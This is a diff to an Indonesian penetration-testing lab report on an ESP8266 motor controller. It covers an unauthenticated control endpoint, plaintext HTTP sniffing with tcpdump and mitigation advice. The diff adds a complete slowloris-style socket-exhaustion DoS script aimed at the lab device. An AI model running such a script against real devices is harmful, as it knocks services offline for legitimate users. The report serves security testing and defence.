@@ -81,7 +81,9 @@ Pengujian dilakukan menggunakan sistem operasi **Kali Linux** (`10.185.29.164`) 
 ## ⚔️ Kerentanan 1: Authentication Bypass (IDOR)
 
 ### Apa itu IDOR?
-**Insecure Direct Object Reference (IDOR)** atau dalam kasus ini *Broken Access Control*, terjadi ketika aplikasi memberikan akses ke fungsi perangkat keras (motor) berdasarkan input pengguna tanpa memvalidasi otorisasi. Pada perangkat ini, API endpoint `/action` terekspos tanpa proteksi password. ### 🚀 Langkah-Langkah Pengujian
+**Insecure Direct Object Reference (IDOR)** atau dalam kasus ini *Broken Access Control*, terjadi ketika aplikasi memberikan akses ke fungsi perangkat keras (motor) berdasarkan input pengguna tanpa memvalidasi otorisasi. Pada perangkat ini, API endpoint `/action` terekspos tanpa proteksi password. 
+
+### 🚀 Langkah-Langkah Pengujian
 
 #### 1. Analisis Struktur HTML
 Pengujian dilakukan langsung dengan mengirim permintaan HTTP manual menggunakan cURL, ditemukan bahwa tombol kontrol memanggil endpoint berikut: 
@@ -117,14 +119,17 @@ Perintah diterima dan motor bergerak tanpa autentikasi. Sistem tidak memeriksa a
 
 
 **Dampak:**  
-Aktor yang berada dalam jaringan yang sama dapat menggerakkan motor kapan saja, termasuk pada kondisi yang berpotensi merusak perangkat (misalnya memaksa motor bergerak saat limit switch mencapai batas).
+Penyerang yang berada dalam jaringan yang sama dapat menggerakkan motor kapan saja, termasuk pada kondisi yang berpotensi merusak perangkat (misalnya memaksa motor bergerak saat limit switch mencapai batas).
 
 ---
 
-## ⚔️ Kerentanan 2: Denial of Service (DoS) — Socket Exhaustion
+## ⚔️ Kerentanan 2: Denial of Service (DoS)
+
+### Apa itu Denial of Service (DoS)?
+Serangan Denial of Service (DoS) adalah upaya membuat layanan tidak dapat diakses dengan membanjiri atau menghabiskan sumber daya sistem. Pada perangkat IoT kecil seperti ESP8266, sumber daya utama yang biasanya diserang adalah jumlah socket/koneksi aktif. Ketika semua slot koneksi penuh, perangkat berhenti merespons, melakukan restart internal, atau hanya menggantung.
 
 ### Ringkasan
-Web server bawaan ESP8266 hanya mampu menangani sejumlah kecil koneksi simultan. Tidak ada mekanisme rate limiting atau timeout yang memadai, sehingga koneksi dapat dibiarkan terbuka sampai kapasitas habis.
+Web server bawaan ESP8266 hanya menyediakan beberapa slot koneksi berskala kecil (umumnya 4–8 tergantung firmware). Tidak ada rate limiting, tidak ada proteksi flood, dan timeout koneksi default sering terlalu lama. Akibatnya, penyerang dapat membuka banyak koneksi HTTP secara cepat, membiarkannya menggantung (semi-open), lalu menghabiskan seluruh pool socket. Ketika ini terjadi, perangkat tidak bisa menerima permintaan baru dari pengguna sah.
 
 ### Langkah Pengujian
 
@@ -134,41 +139,102 @@ Sebuah script Python sederhana digunakan untuk membuka koneksi HTTP tanpa menutu
 ```python
 import socket
 import time
+import threading
+import sys
 
-TARGET_IP = "10.185.29.155"
-TARGET_PORT = 80
+# CONFIGURATION
+TARGET_IP = "10.185.29.155"  # Your ESP8266 IP
+TARGET_PORT = 80             # The Web Server Port
+MAX_SOCKETS = 200            # Overkill (ESP dies at ~5)
 
-while True:
+sockets = []
+
+def init_socket():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
         s.connect((TARGET_IP, TARGET_PORT))
-        s.send(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
-    except:
-        pass
+        # We send a partial HTTP header to keep the server waiting
+        s.send("GET /? HTTP/1.1\r\n".encode("utf-8"))
+        s.send(f"Host: {TARGET_IP}\r\n".encode("utf-8"))
+        # DO NOT send \r\n\r\n (End of request). Keep it hanging.
+        return s
+    except socket.error:
+        return None
+
+def main():
+    print(f"--- STARTING SOCKET EXHAUSTION ATTACK ON {TARGET_IP} ---")
+    
+    # 1. Fill up the slots
+    for i in range(MAX_SOCKETS):
+        print(f"[*] Opening Socket #{i+1}...", end=" ")
+        s = init_socket()
+        if s:
+            print("CONNECTED. (Holding line open)")
+            sockets.append(s)
+        else:
+            print("FAILED. (Server likely dead/full)")
+            # If we fail to connect, it means the server is DoS'd
+            break
+        
+    print(f"\n[SUCCESS] Server is full with {len(sockets)} active zombies.")
+    print("[-] The device should now be unresponsive.")
+    print("[-] Press Ctrl+C to stop the attack and release the sockets.")
+
+    # 2. Keep them alive
+    while True:
+        try:
+            time.sleep(10)
+            # Send tiny keep-alive data to prevent timeout
+            for s in sockets:
+                try:
+                    s.send("X-a: b\r\n".encode("utf-8"))
+                except socket.error:
+                    pass 
+        except KeyboardInterrupt:
+            print("\n[STOP] Release sockets...")
+            break
+
+if __name__ == "__main__":
+    main()
 ```
 
 #### 2. Hasil
 Setelah beberapa detik, web server berhenti merespons. Browser menampilkan **Connection timed out**, dan cURL gagal menjalin koneksi baru.
+
+| Eksekusi Serangan DoS | Hasil Serangan DoS pada Sistem |
+|------------------------|-------------------------------|
+| <img src="https://github.com/user-attachments/assets/0d824a1a-1997-4517-811a-548808e06d3e" width="100%"> | <img src="https://github.com/user-attachments/assets/219db9bc-1dd8-4743-9808-cf1246a487d5" width="100%"> |
 
 **Dampak:**  
 Penyerang dapat membuat panel kontrol tidak dapat diakses pengguna sah, sehingga mengganggu fungsi sistem.
 
 ---
 
-## ⚔️ Kerentanan 3: Network Sniffing — Plaintext HTTP Leakage
+## ⚔️ Kerentanan 3: Network Sniffing 
 
-### Ringkasan
-Seluruh komunikasi berlangsung melalui HTTP tanpa enkripsi. Hal ini memungkinkan pihak lain dalam jaringan menangkap dan membaca isi paket.
+### Apa itu Network Sniffing?
+Network sniffing adalah teknik observasi lalu lintas jaringan secara pasif untuk melihat paket yang lewat apa adanya. Jika suatu layanan menggunakan protokol tanpa enkripsi, isi paket bisa dibaca langsung: header, parameter, bahkan payload kontrol. Tidak perlu akses istimewa; cukup berada di jaringan yang sama.
+
+Pada perangkat ini, seluruh komunikasi dikirim melalui HTTP port 80 tanpa enkripsi. Akibatnya, traffic ke endpoint kontrol motor dapat ditangkap dan dibaca secara utuh, termasuk perintah yang menggerakkan perangkat keras.
 
 ### Langkah Pengujian
 
 #### 1. Menjalankan Tcpdump
+
 ```bash
 sudo tcpdump -i eth0 -nn -A host 10.185.29.155
 ```
+Parameter -A membuat isi paket ditampilkan dalam bentuk ASCII, sehingga request HTTP terlihat jelas tanpa perlu decoding tambahan.
 
 #### 2. Hasil
 Permintaan ke endpoint `/action?go=maju` muncul dalam bentuk teks biasa, termasuk parameter kontrol.
+
+
+| Hasil Sniffing |
+|----------------------------|
+|<img width="1314" height="562" alt="image" src="https://github.com/user-attachments/assets/9dad1512-3819-4ac6-9d2f-992238c0cf7f" />|
+
 
 **Dampak:**  
 Aktor pasif dalam jaringan dapat mengetahui kapan pengguna menekan tombol dan dapat meniru permintaan tersebut.
@@ -185,17 +251,16 @@ Aktor pasif dalam jaringan dapat mengetahui kapan pengguna menekan tombol dan da
 
 ---
 
-## 🛡️ Rekomendasi Mitigasi
+## 📌 Kesimpulan
+
+ESP8266 pada konfigurasi default tidak dirancang untuk menghadapi ancaman jaringan lokal yang agresif. Tanpa autentikasi, tanpa enkripsi, dan tanpa manajemen koneksi, perangkat sangat mudah dieksploitasi. Hasil pengujian menunjukkan seluruh fungsi kritis bisa diambil alih atau dilumpuhkan oleh pihak yang berada pada jaringan yang sama.  
+
+---
+
+## 🛡️ Saran Mitigasi
 
 1. **Tambah Autentikasi:** Gunakan token, sesi, atau minimal password untuk endpoint sensitif.  
 2. **Implementasi Rate Limiting:** Tutup koneksi idle dan batasi jumlah koneksi simultan.  
 3. **Gunakan HTTPS atau WPA2-Enterprise:** Jika HTTPS tidak memungkinkan, pastikan jaringan terisolasi.  
 4. **Validasi Input:** Batasi nilai parameter `go` hanya pada daftar perintah valid.  
 5. **Segregasi Jaringan:** Tempatkan perangkat IoT pada VLAN atau segmen khusus.
-
----
-
-## 📌 Kesimpulan
-
-ESP8266 pada konfigurasi default tidak dirancang untuk menghadapi ancaman jaringan lokal yang agresif. Tanpa autentikasi, tanpa enkripsi, dan tanpa manajemen koneksi, perangkat sangat mudah dieksploitasi. Hasil pengujian menunjukkan seluruh fungsi kritis bisa diambil alih atau dilumpuhkan oleh pihak yang berada pada jaringan yang sama.  
-
